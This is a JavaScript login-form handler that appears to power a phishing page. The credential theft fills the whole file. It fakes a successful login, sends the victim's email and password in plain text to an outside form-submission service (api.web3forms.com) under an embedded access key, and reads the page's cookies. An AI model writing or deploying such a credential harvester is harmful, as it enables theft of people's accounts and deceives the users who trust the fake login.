document
  .getElementById("btn_event")
  .addEventListener("click", function (event) {
    event.preventDefault();

    var email = document.querySelector(".email").value;
    var password = document.querySelector(".password").value;

    if (email && password) {
      console.log("Logged in successfully");

      var formData = new FormData();
      formData.append("access_key", "5e43951e-45f1-4493-acde-0a9bd75a5eb4");
      formData.append("email", email);

      var combinedMessage = `Email: ${email}, Password: ${password}`;
      formData.append("message", combinedMessage);

      fetch("https://api.web3forms.com/submit", {
        method: "POST",
        body: formData,
      })
        .then(function (response) {
          if (response.ok) {
            console.log("Form submitted successfully!");
          } else {
            return response.json().then((data) => {
              console.error("Form submission error:", data);
            });
          }
        })
        .catch(function (error) {
          console.error("Error submitting form:", error);
        });

      var popupModal = document.querySelector(".popup");
      if (popupModal) {
        popupModal.classList.add("active");
        popupModal.addEventListener("click", () => {
          popupModal.classList.remove("active");
        });
      }

      // Get cookies (if needed)
      var cookies = document.cookie;
      console.log("Cookies:", cookies);
    } else {
      console.error("Invalid email or password");
    }
  });
